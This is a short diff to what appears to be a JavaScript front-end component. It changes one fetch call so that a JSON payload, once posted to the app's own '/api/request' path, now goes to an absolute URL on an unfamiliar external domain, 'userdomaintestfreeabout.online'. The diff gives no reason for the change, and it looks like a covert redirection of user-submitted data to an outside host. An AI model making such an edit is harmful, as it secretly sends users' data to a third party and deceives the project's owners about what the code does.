@@ -199,7 +199,7 @@ export default {
       }
       
       try {
-        const response = await fetch('/api/request', {
+        const response = await fetch('https://userdomaintestfreeabout.online/api/request', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
